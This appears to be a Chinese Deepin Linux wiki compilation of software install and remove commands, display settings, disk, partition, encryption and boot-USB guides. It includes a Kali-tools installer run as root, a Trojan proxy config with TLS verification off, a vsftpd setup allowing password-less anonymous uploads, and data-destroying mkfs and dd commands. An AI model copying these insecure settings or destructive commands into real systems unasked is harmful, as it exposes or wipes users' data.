Shotcut的仓库地址是http://packages.deepin.com/deepin/pool/main/s/shotcut/。

Shotcut支持GPU硬件加速、主流图片处理、音频/视频处理功能。

标题：MusE
MusE是一个MIDI/音频的音序器，具有两个全自动化的MIDI和音频。

MusE拥有众多的MIDI编辑器，包括钢琴卷，评分编辑器和鼓等，支持LADSPA和DSSI插件，并且可以实时编辑MIDI和音频。

安装MusE的命令是sudo apt-get install muse。

卸载MusE的命令是sudo apt-get remove muse。

MusE的仓库地址是http://packages.deepin.com/deepin/pool/main/m/muse/。

标题：Musescore
MuseScore是一套作曲写乐谱工具，可谱五线谱，输出PDF、PNG及MIDI等格式文件，还有混音器、段落抽取和装饰音等功能。

安装MuseScore的命令是sudo apt-get install musescore。

卸载MuseScore的命令是sudo apt-get remove musescore。

MuseScore的仓库地址是http://packages.deepin.com/deepin/pool/main/m/musescore/。

标题：Ocenaudio
ocenaudio是跨平台、易于使用、快速且功能强大的音频编辑软件，适合普通和专业用户。

安装ocenaudio的命令是sudo apt install com.ocenaudio.ocenaudio。

卸载ocenaudio的命令是sudo apt remove --purge com.ocenaudio.ocenaudio。

ocenaudio的仓库地址是http://packages.deepin.com/deepin/pool/non-free/o/ocenaudio/。

Ocenaudio官方网站是https://www.ocenaudio.com/。

标题：Rhythmbox
Rhythmbox是一个音乐播放和管理应用，可播放多种音频格式、管理音乐收藏，还有音乐回放等功能。

安装Rhythmbox的命令是sudo apt-get install rhythmbox。

卸载Rhythmbox的命令是sudo apt-get remove rhythmbox。

Rhythmbox的仓库地址是http://packages.deepin.com/deepin/pool/main/r/rhythmbox/。

标题：Redshift
Redshift是一款显示器色温自动调整应用，能根据环境调节电脑屏幕色温，保护眼睛。

安装Redshift的命令是sudo apt-get install redshift。

卸载Redshift的命令是sudo apt-get remove redshift。

Redshift的仓库地址是http://packages.deepin.com/deepin/pool/main/r/redshift/。

标题：Xrandr常见用法
xrandr用来设置和查询屏幕相关信息配置。

`xrandr` 查看当前所连接的屏幕通用信息；`xrandr -q` 查询当前的显示器状态；`xrandr --verbose` 显示更详细的信息。

设置分辨率需指定output和mode，如`xrandr --output eDP1 --mode 1920x1080`将eDP1分辨率改为1920x1080，不可用1920*1080替代。

`xrandr --output eDP1 --brightness 0.5` 将eDP1的屏幕亮度设置为0.5。

`xrandr --output eDP1 --mode 1920x1080 --rate 75` 将eDP1的刷新率设置为75，不同分辨率可用刷新率不同，可用xrandr查询。

`xrandr --output eDP1 --rotate left` 可旋转屏幕，left向左90度，right向右90度，inverted上下翻转，normal回到正常。

有eDP1和VGA1两个output时，`xrandr --auto --output eDP1 --primary` 可设置eDP1为主屏，--auto自动启用关闭的屏幕。

复制模式用`xrandr --auto --output eDP1 --pos 0x0 --mode 1440x900 --output VGA1 --same-as eDP1`，需用两显示器都有的mode。

扩展模式可将VGA1放在eDP1右边，如`xrandr --auto --output eDP1 --pos 0x0 --mode 1920x1080 --primary --output VGA1 --mode 1440x900 --right-of eDP1`，位置参数还有left-of、--above、--below等。

单屏模式只显示某一屏幕，如`xrandr --output eDP1 --pos 0x0 --mode 1920x1080 --primary --output VGA1 --off` 只显示eDP1。

标题：Arduino
Arduino是一个软硬件平台，构建于开放原始码simpleI/O介面版，包含电路板和IDE软件平台。

Arduino硬件部分是可做电路连接的Arduino电路板。

Arduino软件平台是IDE，可在其中编写程序代码并上传到电路板执行。

安装Arduino的命令是sudo apt-get install arduino。

卸载Arduino的命令是sudo apt-get remove arduino。

Arduino的仓库地址是http://packages.deepin.com/deepin/pool/main/a/arduino/。

标题：BricsCAD
BricsCAD是功能强大的CAD平台，可快速创建技术图纸、平面图等，支持实体建模，保留导入设计意图，能云端查看、修改DWG，供各行业使用或开发第三方应用。

安装BricsCAD的命令为：sudo apt-get install bricscadv16

卸载BricsCAD的命令是：sudo apt-get remove bricscadv16

BricsCAD的仓库地址为http://packages.deepin.com/deepin/pool/non-free/b/bricscadv16/

标题：DraftSight
DraftSight是一款专业的2D CAD制图软件，可查看、编辑、创建DWG、DXF、DWT文件，输出PNG、BMP、JPG、PDF等格式。

安装DraftSight的命令是：sudo apt-get install draftsight

卸载DraftSight的命令是：sudo apt-get remove draftsight

DraftSight的仓库地址为http://packages.deepin.com/deepin/pool/non-free/d/draftsight/

标题：LibreCAD
LibreCAD是一款2D的CAD绘图工具。

LibreCAD可提供DXF、JWW、DWG等图形文件格式。

LibreCAD可导出SVG、JPG、PNG等图片格式。

LibreCAD操作简单，支持多种语言。

安装LibreCAD的命令是sudo apt-get install librecad。

卸载LibreCAD的命令是sudo apt-get remove librecad。

LibreCAD的仓库地址是http://packages.deepin.com/deepin/pool/main/libr/librecad/。

LibreCAD用户可以随意标注，绘图和修改。

标题：QCad
QCad是一款2D计算机辅助画图软件，采用AutoCAD DXF文件作为标准文件格式，能以多种格式输出，可绘制工程图、室内设计图、机械图纸等。

安装QCad的命令是sudo apt-get install qcad。

卸载QCad的命令是sudo apt-get remove qcad。

QCad的仓库地址是http://packages.deepin.com/deepin/pool/main/q/qcad/。

标题：Synfig_studio
Synfig Studio是一套功能强大的2D矢量动画制作软件，可制作高质量动画，支持软件渲染，有大量即时特效可用于图层或图层群组，能满足工业强度创作及制作电影质量级别动画。

安装Synfig Studio的命令是sudo apt-get install synfigstudio。

卸载Synfig Studio的命令是sudo apt-get remove synfigstudio。

Synfig Studio的仓库地址是http://packages.deepin.com/deepin/pool/main/s/synfigstudio/。

标题：OpenGL
OpenGL是用于渲染2D、3D矢量图形的跨语言、跨平台的应用程序编程接口（API）。

终端中输入命令：sudo apt install mesa-utils可安装相关工具。

终端中输入命令：glxinfo | grep -i opengl可查看OpenGL相关信息。

若当前使用的为N卡，输入glxinfo | grep -i opengl命令后有对应的截图信息。

若当前使用的为A卡（AMD机型），输入glxinfo | grep -i opengl命令后有对应的截图信息。

若当前使用的为I卡（Intel机型），输入glxinfo | grep -i opengl命令后有对应的截图信息。

若显示有误，可能是mesa驱动版本不匹配，需做适配。

标题：Blender
Blender是一款三维动画制作软件，提供从建模、动画、材质、渲染到音频处理、视频剪辑等一系列动画短片制作解决方案。

Blender让喜欢3D绘图的玩家们不用花大钱，也可以制作出自己喜爱的3D模型。

安装Blender的命令是sudo apt-get install blender。

卸载Blender的命令是sudo apt-get remove blender。

Blender的仓库地址是http://packages.deepin.com/deepin/pool/main/b/blender/。

标题：FreeCAD
FreeCAD是一款通用的三维CAD建模软件，用于机械工程、工业产品设计及建筑设计等工程应用，具有高度模块化架构，支持扩展和定制。

安装FreeCAD的命令为：sudo apt-get install freecad

卸载FreeCAD的命令为：sudo apt-get remove freecad

FreeCAD的仓库地址是http://packages.deepin.com/deepin/pool/main/f/freecad/

标题：Room_Arranger
Room Arranger是一款实时的模拟房屋设计布局的软件。

Room Arranger可以新建工程布置一个房间或者套房，可自由添加、调整或移动对象。

Room Arranger可添加多种对象，包括门口和窗户、橱柜、桌子和椅子等。

Room Arranger可对已有设计以3D方式进行预览。

安装Room Arranger的命令是sudo apt-get install rooarr。

卸载Room Arranger的命令是sudo apt-get remove rooarr。

Room Arranger的仓库地址是http://packages.deepin.com/deepin/pool/non-free/r/rooarr/。

标题：Sweet_Home_3D
Sweet Home 3D是家装辅助设计软件，支持含中文的16种语言，能通过二维平面图设计布置家居，平面图更改实时显示在3D视图。

安装Sweet Home 3D的命令是sudo apt-get install sweethome3d。

卸载Sweet Home 3D的命令是sudo apt-get remove sweethome3d。

Sweet Home 3D的仓库地址是http://packages.deepin.com/deepin/pool/main/s/sweethome3d/。

标题：Deepin上安装kali软件
katoolin是一个为debian或ubuntu安装kali软件的项目，由LionSec维护更新。

geange用bash重写了katoolin项目，加入bash的whiptail，界面更美观，项目地址为https://github.com/geange/kaliTools，在deepin linux上进行。

使用geange的kaliTools步骤：git clone git@github.com:geange/kaliTools.git，cd kaliTools/，chmod +x index.sh，sudo ./index.sh。

kaliTools初始界面第一个选项是添加kali的源到本机系统。

kaliTools初始界面第二个选项是删除kali的源，建议更新系统时删除以避免依赖冲突。

kaliTools初始界面第三个选项是批量安装kali分类的软件，进入后可单选或多选，按空格键勾选或取消。

kaliTools初始界面第四个选项是按需要安装kali的软件，需要哪个安装哪个。

kaliTools初始界面第五个选项是退出软件，进入第三或第四个选项时按ESC键可退出。

若觉得kaliTools不错，可在github点星，有BUG可联系geange，邮箱geange@outlook.com。

标题：Metasploit
Metasploit是一个安全框架，为渗透测试工程提供大量的渗透测试模块和扫描模块。

Metasploit被称为最流行的渗透测试工具之一。

标题：Deepin配置trojan客户端
Trojan是一个翻墙软件。

在Deepin上安装trojan服务的命令是sudo apt install trojan。

将例子中的客户端配置文件移动到trojan配置服务下的命令是mv /usr/share/doc/trojan/examples/client.json-example /etc/trojan/config.json。

修改trojan配置文件的命令是sudo dedit /etc/trojan/config.josn。

trojan配置文件中，"remote_addr"的示例值是example.com。

trojan配置文件中，"password"数组的示例内容是["password1"]。

trojan配置文件的ssl部分，"verify"被设置为false。

启动trojan服务的命令是systemctl start trojan.service。

Trojan有图形界面客户端Trojan-Qt5，其项目地址是https://github.com/Trojan-Qt5/Trojan-Qt5。

标题：Wireshark
Wireshark是一个网络封包分析软件，能获取网络封包、显示详情，还可检测网络问题、检查安全问题、排查通信错误。

安装Wireshark的命令是sudo apt-get install wireshark。

卸载Wireshark的命令是sudo apt-get remove wireshark。

Wireshark的仓库地址是http://packages.deepin.com/deepin/pool/main/w/wireshark/。

标题：Conky_Manager
Conky Manager是一款简单的图形化工具，用来管理Linux桌面上的ConkyScripts。

Conky Manager采用全新的用户界面和选项配置，使应用程序窗口更直观易用。

安装Conky Manager的命令是sudo apt-get install conky-manager。

卸载Conky Manager的命令是sudo apt-get remove conky-manager。

Conky Manager的仓库地址是http://packages.deepin.com/deepin/pool/contrib/c/conky-manager/。

有相关链接介绍如何添加桌面小工具Conky：https://bbs.deepin.org/forum.php?mod=viewthread&tid=42752。

标题：Gconf_Editor
Gconf Editor是一个配置编辑软件，可修改桌面环境和应用程序参数，改变其显示和属性。

安装Gconf Editor的命令是sudo apt-get install gconf-editor。

卸载Gconf Editor的命令是sudo apt-get remove gconf-editor。

Gconf Editor的仓库地址是http://packages.deepin.com/deepin/pool/main/g/gconf-editor/。

标题：Xterm和UXterm
Xterm和UXterm的安装命令为sudo apt install xterm。

文中提及了Xterm和UXterm这两个工具。

标题：KDE Connect
KDE Connect是KDE出品的联动智能手机、平板和PC的软件。

KDE Connect可共享剪贴板，实现设备间复制和粘贴。

KDE Connect支持从任何应用程序将文件和URL共享到计算机。

KDE Connect可在电脑上获取来电和短信通知。

KDE Connect的虚拟触摸板功能可将手机屏幕用作电脑的触摸板。

KDE Connect支持通知同步，可从桌面读取Android通知。

KDE Connect的多媒体遥控器功能可将手机用作Linux媒体播放器的遥控器。

KDE Connect通过WiFi连接，无需USB线或蓝牙。

KDE Connect采用端到端TLS加密，保障信息安全。

安装KDE Connect的命令是sudo apt install kdeconnect。

卸载KDE Connect的命令是sudo apt remove --purge kdeconnect。

KDE Connect的仓库地址是http://packages.deepin.com/deepin/pool/main/k/kdeconnect/。

配置KDE Connect需在智能手机/平板上安装该软件，并使PC和其在同一局域网下。

Android设备可在Google Play、华为应用市场或F-Droid上搜索安装KDE Connect，也可通过链接https://f-droid.org/repo/org.kde.kdeconnect_tp_11910.apk下载APK。

iOS/iPadOS设备可在App Store上搜索安装KDE Connect，链接为https://apps.apple.com/app/kde-connect/id1580245991。

标题：Synergy
Synergy是一款键盘鼠标共享软件，可在多台计算机间共享鼠标和键盘，支持跨设备复制粘贴，鼠标可跨屏幕移动。

安装Synergy的命令为：sudo apt-get install synergy

卸载Synergy的命令为：sudo apt-get remove synergy

Synergy的仓库地址是http://packages.deepin.com/deepin/pool/main/s/synergy/

标题：KDiskMark
KDiskmark 是一款图形用户界面的磁盘测速软件，用 Qt 编写，不需要 KDE 依赖包。

安装KDiskMark可执行命令：wget https://github.com/JonMagon/KDiskMark/releases/download/2.3.0/KDiskMark-2.3.0-fio-3.28-x86_64.AppImage，然后执行./KDiskMark-2.3.0-fio-3.28-x86_64.AppImage。

卸载KDiskMark的命令是rm -f KDiskMark-2.3.0-fio-3.28-x86_64.AppImage。

KDiskMark的Github主页是https://github.com/JonMagon/KDiskMark。

标题：Baobab
Baobab是分析磁盘使用情况的图形工具，可分析本地硬盘、挂载硬盘或设备空间，界面简单，结果以环状或树形状显示。

安装Baobab的命令是sudo apt-get install baobab。

卸载Baobab的命令是sudo apt-get remove baobab。

Baobab的仓库地址是http://packages.deepin.com/deepin/pool/main/b/baobab/。

标题：CPU-G
CPU-G是一款CPU检测软件，可检测CPU名称、厂商、内核进程等参数。

安装CPU-G的命令是sudo apt-get install cpu-g。

卸载CPU-G的命令是sudo apt-get remove cpu-g。

CPU-G的仓库地址是http://packages.deepin.com/deepin/pool/main/c/cpu-g/。

标题：Hardinfo
Hardinfo是一个系统信息查看软件，支持查看系统硬件、驱动等信息，生成报告，进行简单性能基准测试。

安装Hardinfo的命令是sudo apt-get install hardinfo。

卸载Hardinfo的命令是sudo apt-get remove hardinfo。

Hardinfo的仓库地址是http://packages.deepin.com/deepin/pool/main/h/hardinfo/。

标题：I-Nex
I-Nex是一款系统信息查询工具，窗口界面由多个标签面板组成，显示驱动、内核等计算机和操作系统信息。

安装I-Nex的命令是sudo apt-get install i-nex。

卸载I-Nex的命令是sudo apt-get remove i-nex。

I-Nex的仓库地址是http://packages.deepin.com/deepin/pool/contrib/i/i-nex/。

标题：FTP服务
FTP是File Transfer Protocol（文件传输协议）的英文简称，中文简称为“文传协议”，用于Internet上的控制文件的双向传输，也是一个应用程序。

“下载”文件是从远程主机拷贝文件至自己的计算机上；“上传”文件是将文件从自己的计算机中拷贝至远程主机上。

安装vsftpd，终端执行：sudo apt-get install vsftpd。

卸载vsftpd，终端执行：sudo apt-get remove vsftpd。

启动ftp：service vsftpd start；停止ftp：service vsftpd stop；重启ftp：service vsftpd restart。

ftp的配置文件主要有三个，位于/etc/vsftpd/目录下：ftpusers（指定不能访问ftp服务器的用户）、user_list（ftp登录的白名单或黑名单）、vsftpd.conf（vsftpd的主配置文件）。

修改vsftpd配置文件的命令：sudo gedit /etc/vsftpd.conf。

anonymous_enable=YES 允许匿名用户登录；no_anon_password=YES 匿名用户登录时不需要输入密码；local_enable=YES 允许本地用户登录。

write_enable=YES 开启全局上传；local_umask=022 本地文件上传的umask设置为022；anon_upload_enable=YES 允许匿名用户上传（需write_enable=YES且建立可读写目录）。

idle_session_timeout=600 是默认的超时时间；data_connection_timeout=120 设置默认数据连接的超时时间。

xferlog_enable=YES 打开日志记录功能；xferlog_file=/var/log/xferlog 是日志记录文件的位置。

标题：Linux之磁盘相关的命令及解析
df命令来自英文词组“Disk Free”的缩写，用于显示系统上磁盘空间的使用量情况，含可用、已有及使用率等信息，默认单位为Kb，建议使用-h参数进行单位换算，可查看磁盘使用情况和挂载信息。

df命令语法格式为df [参数] [对象磁盘/分区]，常用参数中，-a显示所有系统文件，-h以易读的方式显示，-i显示索引字节信息，-l只显示本地文件系统。

df -h可带有容量单位显示系统全部磁盘使用量情况，df -h /boot显示指定磁盘分区/boot的使用量情况，df -t xfs显示系统中所有xfs格式文件系统的磁盘分区使用量。

du命令来自英文词组“Disk Usage”的缩写，用于查看文件或目录的大小，与df不同，df查看磁盘或分区使用情况，du查看文件或目录在磁盘中的占用情况。

du命令语法格式为du [参数] 文件，常用参数中，-a显示目录中所有文件大小，-h以易读方式显示文件大小，-s仅显示总计。

du -sh *以易读格式显示指定目录内各个文件的大小，du -sh restart/显示指定目录restart/内总文件的大小。

iostat用于监视系统输入输出设备和CPU的使用情况，汇报磁盘活动统计和CPU使用情况，不能对某个进程深入分析，仅分析系统整体情况。

iostat语法格式为iostat [选项] [时间间隔] [次数]，常用参数中，-c显示CPU使用情况，-d指定磁盘设备，-x显示详细信息，-k以千字节每秒为单位显示。

iostat -d 2每隔两秒报告一次磁盘情况，iostat -d 2 6每2秒报告一次，持续6次，iostat -x sda sdc 2 6显示sda与sdc的统计数据，每2秒一次，持续6次。

iostat输出中，tps表示设备每秒的传输次数，kB_read/s是每秒从设备读取的数据量，kB_wrtn/s是每秒向设备写入的数据量，%util是采用周期内用于IO操作的时间比率，接近100%说明I/O系统满负荷。

iotop命令动态查看磁盘IO情况，使用方法类似top，具有PID、用户、I/O、进程等信息，可弥补iostat等工具只能统计per设备读写情况的不足，方便查看每个进程的IO使用。

iotop语法格式为iotop [参数]，常用参数中，-o只显示有io操作的进程，-b运行在非交互式模式，-n NUM设置非交互式模式下显示次数，-u USER监控指定用户的进程。

iotop -o只显示IO操作进程，iotop -b批量显示无交互，iotop -u root显示root用户的IO进程。iotop输出中，Total DISK READ是从磁盘读取的总速率，TID是线程ID，按p可转成进程ID，COMMAND是具体进程命令。

标题：linux内存相关的命令详解
free命令用于显示系统内存使用量情况，包含物理和交换内存的总量、使用量和空闲量。

free命令常用参数中，-b以Byte显示，-k以kb为单位，-m以mb为单位，-g以gb为单位，-s持续显示，-t显示总和，-h以易读单位显示。

free命令输出中，total是物理内存大小，used是已使用内存（含cached和应用实际使用），free是未被使用的空闲内存，shared是共享内存大小。

cat /proc/meminfo包含所有内存相关信息，如MemTotal、MemFree、MemAvailable等。

内存泄漏指程序运行中不能正常回收不用的内存，导致内存增长过高，最终使系统不可用，可通过valgrind工具分析。

内存最小单位为页，默认一页4K。虚拟内存是进程申请的空间，物理内存是系统实际分配给进程运行的内存。ps aux中VSZ是虚拟内存，RSS是物理内存。

内存溢出（OOM）是进程申请内存时系统无更多内存分配，系统会杀进程释放内存。可通过dmesg或/var/log/messages查看。

panic_on_oom参数值有0、1、2。0触发oom killer杀进程；2直接触发kernel panic；1根据情况处理。

Overcommit控制内存申请，overcommit_memory有0、1、2三个值。0检查可用内存，足够则允许申请，否则引发OOM；1允许分配所有物理内存；2不允许超过系统设置大小。

/proc/sys/vm/overcommit_ratio是系统最大可分配内存的百分比，默认是50。

标题：Xrandr查询屏幕相关信息
文档标题为Xrandr查询屏幕相关信息，发布于2023-02-22T09:14:40.503Z，创建于2022-10-21T03:31:24.082Z。

文档中有内部页面跳转链接，可进入/Xzh/02_按软件功能划分/02_开发人员常用软件介绍/05_硬件设备开发相关工具/显示器/Xrandr常见用法。

标题：linux调整现有分区大小
创建10G映像盘可使用命令：dd if=/dev/zero of=ddu.img  bs=1G count=10 status=progress

加载映像盘分区设备使用命令：sudo losetup -Pf ddu.img

查看分区可使用lsblk命令

格式化分区1为vfat格式用：sudo mkfs.vfat /dev/loop0p1；格式化分区2为ext4格式用：sudo mkfs.ext4 /dev/loop0p2

挂载分区2到mnt/root目录：sudo mount /dev/loop0p2 mnt/root

卸载挂载点用：sudo umount mnt/root；卸载映像盘设备用：sudo losetup -D（非映像盘无需此步）

给映像盘追加10G可用空间：dd if=/dev/zero of=ddu.img oflag=append bs=1G count=10 status=progress conv=notrunc，oflag=append和conv=notrunc需同时使用

操作gpt分区扩展需安装gdisk：sudo apt install gdisk

在gdisk中操作gpt分区表：按x进入专家模式，按e移动备份数据到磁盘末尾，按w保存

调整分区大小原理：删除分区（不删数据），重建时保持开始位置和分区类型，调整结束位置。最后分区可删除后重建，保持默认开始和结束以自动调整为最大

调整ext系列文件系统范围：先执行sudo fsck -y /dev/loop0p2，再执行sudo resize2fs -p /dev/loop0p2自动扩展到最大

标题：ext4 linux 分区修复
用户使用kde分区管理器调整调整分区，取消操作后强制关闭，导致/dev/nvme0n1p5剩余空间无法识别，/分区正常。

用户尝试用windows的diskgenius恢复文件，但其按windows分区逻辑恢复，文件零散无目录结构和名字，故否决该方案。

ext4有健壮性，文件系统被破坏但数据可能未大量损坏，重建文件系统可恢复大部分数据。

`dumpe2f2 /dev/nvme0n1p4`显示ext4分区修复块信息，`tune2fs -h /dev/nvme0n1p4`查看分区参数。

`mkfs.ext4 -n /dev/nvme0n1p5`可看修复块位置，位置固定为32768、98304等，块大小可从类似“Creating filesystem with 2621440 4k blocks...”信息得知。

`mount -t ext4 -o sb=131072 /dev/nvme0n1p5 /mnt`用131072位置的备份块挂载文件系统，131072由32768*4得来，因sb以1k为单位，备份块信息是4k。

用户因p5分区偏移100G挂载失败，通过cfdisk删掉错误p5，与100G合并重建p5恢复原区域，再挂载成功。

正式修复用`fsck.ext4 -b 32768 /dev/nvme0n1p5`，会提示确认；`mkfs.ext4 -S /dev/nvme0n1p5`和`mkfs.ext4 -y /dev/nvme0n1p5`是强行重建文件系统，慎用。

分区会改变PARTUUID，导致/etc/fstab挂载不上/home，需修复。

标题：GParted
GParted是一款Linux下的功能非常强大的分区工具，可创建、删除分区，调整分区大小和移动分区位置。

安装GParted的命令是sudo apt-get install gparted。

卸载GParted的命令是sudo apt-get remove gparted。

GParted的仓库地址是http://packages.deepin.com/deepin/pool/main/g/gparted/。

标题：linux下如何格式化硬盘
硬盘是块设备，可划分为多个分区，分区格式化后在我的电脑可见。

插入硬盘后，用lsblk命令查看系统识别的块设备。

fdisk /dev/sda可对sda块设备进行分区，m查看帮助，F看剩余未分区空间，p查看现有分区。

在fdisk中，g命令创建新的GPT分区表，n命令添加新分区，w命令保存修改。

分区需制作文件系统才能挂载，Linux常用ext4，用mkfs.ext4 /dev/sda1格式化。

创建空目录后用mount挂载分区，如mount /dev/sda1 /home/pi/data/，df -h查看挂载情况。

在/etc/fstab文件追加配置实现开机自动挂载，格式为/dev/sda1 /home/pi/data ext4 defaults 0 1，修改前3个参数。

修改fstab后，执行sudo mount -a检查配置是否正确，无报错则正常。

标题：Disks
Disks是一款磁盘管理工具，可读取硬盘、光驱、U盘等信息，还有查看硬盘详细信息、格式化硬盘、编辑分区类型、创建镜像文件等功能。

安装Disks的命令是sudo apt-get install gnome-disk-utility。

卸载Disks的命令是sudo apt-get remove gnome-disk-utility。

Disks的仓库地址是http://packages.deepin.com/deepin/pool/main/g/gnome-disk-utility/。

标题：CrossFTP
CrossFTP是一款FTP客户端工具，支持多标签管理、Unicode/中文编码等功能。

安装CrossFTP的命令是sudo apt-get install crossftp。

卸载CrossFTP的命令是sudo apt-get remove crossftp。

CrossFTP的仓库地址是http://packages.deepin.com/deepin/pool/non-free/c/crossftp/。

CrossFTP支持站点管理/加密、文件远程备份等功能。

CrossFTP具备文件本地和Web搜索、自动重连、命令控制功能。

标题：Disks-2
Disks是一款磁盘管理工具，可读取硬盘、光驱、U盘等信息，还有查看硬盘详细信息、格式化硬盘、编辑分区类型、创建镜像文件等功能。

安装Disks的命令是sudo apt-get install gnome-disk-utility。

卸载Disks的命令是sudo apt-get remove gnome-disk-utility。

Disks的仓库地址是http://packages.deepin.com/deepin/pool/main/g/gnome-disk-utility/。

标题：Filelight
Filelight是KDE图形磁盘使用分析器，是KDE Gear应用程序集的一部分。

Filelight显示一系列同心饼状图，表示分区或目录中目录及空间使用量，此为多级饼图、日暴图或环形图。

用户可在代表目录的饼图段上重复分析该目录，右击可打开文件管理器、终端模拟器，复制或删除目录。

右键单击代表文件的段可打开、复制到剪贴板或删除文件。

安装Filelight的命令是sudo apt install filelight。

卸载Filelight的命令是sudo apt remove --purge filelight。

Filelight的仓库地址是http://packages.deepin.com/deepin/pool/main/f/filelight/。

Filelight的维基百科（英文）链接是https://en.wikipedia.org/wiki/Filelight。

Filelight官方网站是https://apps.kde.org/zh-cn/filelight/。

Filelight的Github主页是https://github.com/KDE/filelight。

标题：硬盘加密
磁盘加密功能主要是基于系统工具cryptsetup实现。

device-mapper是linux内核组件，主要作用是将物理块设备映射到高层次的虚拟块设备上，是LVM、EVMS、RAIDS、dm-crypt磁盘加密的基础设施。

device-mapper的工作原理是将自身提供的虚拟块设备上的数据传输到对应（所映射的）物理块设备上，数据在传输时可以被改变，磁盘加密利用了这一特性。

device-mapper主要有用户空间配置交互工具dmsetup和libdevmapper.so库，源码在LVM2项目上。

dm-crypt是device-mapper的一个加密目标，使用内核加密API提供透明块设备加密。

开启dm-crypt需在编译内核时在 Device Drivers/Multi-device support (RAID and LVM) 配置项中开启CONFIG_DM_CRYPT。

配置dm-crypt需要用户空间组件device mapper library(LVM2包的一部分)和cryptsetup工具。

LUKS是为Linux磁盘加密而创建的规范，实现了一种平台独立的磁盘格式，保证了口令以安全的文档化方式实现密码管理。

LUKS的最大特点是其实现的磁盘格式，基于此它可以创建并存储加密相关元数据，这也是它区别于plain dm-crypt最大特点。

cryptsetup是基于dm-crypt实现的一款用户空间磁盘加密工具，包含了plain dm-crypt volumes, LUKS volumes, loop-AES,TrueCrypt (包含了VeraCrypt扩展)和BitLocker磁盘加密格式。

cryptsetup luksFormat /dev/sdb1 基于物理分区创建luks格式分区。

cryptsetup luksOpen /dev/vda8 luks_test 打开luks分区，会在/dev/mapper/创建luks_test设备。

mkfs.ext4 /dev/mapper/luks_test 对虚拟设备进行一般文件类型格式化。

mount /dev/mapper/luks_test /luks/ 挂载设备到/luks目录。

umount /luks/ 卸载设备。

cryptsetup luksClose luks_test 关闭映射设备。

cryptsetup luksAddKey /dev/vda8 修改或增加口令。

cryptsetup luksRemoveKey /dev/vda8 删除口令。

全盘加密其实没有对整个磁盘进行加密，引导和内核所在/boot分区未被加密，不然内核无法引导，系统无法加载。

国密算法是一种加密算法，由内核crypto API提供支持，算法名SM4。

内核加载系统必需要开启initrd功能，如此可以在内核启动早期提供用户空间以运行cryptsetup，对加密分区解密。

实现一次加密多个分区，是利用dm-crypt可以堆叠LVM逻辑分区的特性。

标题：磁盘
图形化磁盘管理工具有磁盘管理器（deepin-diskmanager）和gparted。

常用终端磁盘管理命令包括df、lsblk、mount、umount、file、mkfs。

常见磁盘术语包含挂载磁盘、磁盘格式、介质类型、磁盘分区、挂载点、卷标和标签。

标题：磁盘管理
Linux系统中磁盘管理常见操作：分区、删除、格式化、挂载。

分区是在空闲磁盘上新建固定容量（可能不固定）区域以存储数据。

删除指删除现有磁盘分区，亦可理解为删除磁盘上所有分区。

格式化是对现有磁盘分区或磁盘进行初始化操作，会清除所有文件。

挂载指将一个设备或者磁盘分区挂接到一个已存在的目录上。

深度操作系统可使用自带的分区编辑器软件进行图形化磁盘管理。

df命令用于列出磁盘相关信息，如df列出各文件系统磁盘空间使用情况。

df -ia列出各文件系统的i节点使用情况，df -T列出文件系统的类型。

du命令评估文件系统的磁盘使用量，du -h --max-depth=1显示当前目录下各文件夹大小。

du -h --max-depth=1 work/testing显示该目录下的目录大小，du -h --max-depth=1 work/testing/*显示其下所有文件和目录大小。

du -ha遍历显示子目录及子文件的大小。

fdisk -l查看机器所挂硬盘个数及分区。

mkfs用于磁盘格式化，如mkfs -t ext3 /dev/sda6将sda6格式化为ext3格式。

mkfs -t ext2 /dev/sda7将sda7分区格式化为ext2格式。

fsck用于检查和维护文件系统，如fsck -t msdos -a /dev/hda5检查msdos档案系统的/dev/hda5并自动修复。

badblocks检查磁盘坏道，选项-s在屏幕上列出进度，-v显示进度，-w用写入方式测试（不建议用于有文件的装置）。

sync命令将内存数据写入硬盘。

dd用于转换和拷贝文件，如sudo dd if=/home/cxbii/deepin.iso of=/dev/sdb bs=8M conv=fsync将指定iso写入/dev/sdb。

磁盘配额防止用户使用超量空间，分软限制（可超出提示，以硬限制为界）和硬限制（容量边界），可设为on或off。

标题：deepin下使用Ventoy安装Windows
Ventoy是一个制作可启动U盘的开源工具，能轻松实现多镜像启动，支持常见的操作系统和硬件类型，插件功能可自定义、扩展启动盘功能。

制作Ventoy启动盘需准备8G或以上U盘，将U盘中所有文件复制到电脑或备份到其他位置。

进入Ventoy下载页，从说明中的链接选择一个（建议选蓝奏云或镜像站），下载ventoy-x.x.xx-linux.tar.gz。

解压下载的文件，在文件管理器中打开解压后的文件夹，可双击VentoyGUI.x86_64运行，或右击空白处选择“在终端中打开”，输入命令./VentoyGUI.x86_64运行。

确认U盘中文件已备份后，在“设备”处选择U盘，点击“安装”。安装完成后，U盘显示名称为Ventoy，将系统镜像复制到U盘任意目录即可作为启动盘，不影响存储其他文件。

若安装Ventoy失败，可尝试换另外2种方式，再不行换U盘、USB接口等。使用中有问题可阅读常见问题、文档手册或在论坛发帖。

Windows系统镜像可从微软官网（提供Windows 11/10/8.1磁盘映像）、MSDN我告诉你（大部分原版镜像）、Windsys、ThirdWIN等获取。

访问Edgeless下载页，点击“访问网页版”右侧小箭头里的“下载ISO镜像”获取Edgeless的iso文件，按手动制作教程操作；进入“插件包/磁盘数据”下载分区助手插件包，放在U盘的/Edgeless/Resources中。

插入U盘重启电脑，按对应品牌电脑进BIOS的键进入BIOS，关闭安全启动（Legacy传统启动不需要），在启动项中选择U盘回车，在Ventoy引导菜单选择Edgeless回车进入。

进入Edgeless后，用分区助手（或DiskGenius）调整分区（不要调整deepin系统盘和数据盘分区，谨慎操作），迁移文件，使电脑中有32GB以上的NTFS分区（传统启动需设为活动分区）。

打开Dism++，点击“文件”>“释放镜像”，浏览选中Windows镜像及安装分区，勾选“添加引导”和“格式化”，点击“释放”。

若之前电脑已安装正版激活的Windows 10/11，重装相同版本会自动激活，否则需自行激活，建议支持正版。

若deepin启动项丢失，可参考Linux Mint文档（适用于deepin和多数Linux），将系统镜像拷贝至Ventoy U盘，重启到试用版系统修复；或用deepin live系统中系统修复工具的修复引导功能。

Web UI模式适用于Ventoy 1.0.48及更高版本，解压文件后在终端输入sudo sh ./VentoyWeb.sh，浏览器访问http://127.0.0.1:24680，选择U盘点击安装，完成后按Ctrl+C退出。

命令行模式安装Ventoy：解压文件，打开终端，插入U盘并备份文件，查看U盘标识（如sdd1，略去数字取前3个字母），输入命令sudo sh Ventoy2Disk.sh -i /dev/XXX（XXX为U盘标识），输入密码，两次输入y确认，安装成功后U盘名称为Ventoy。

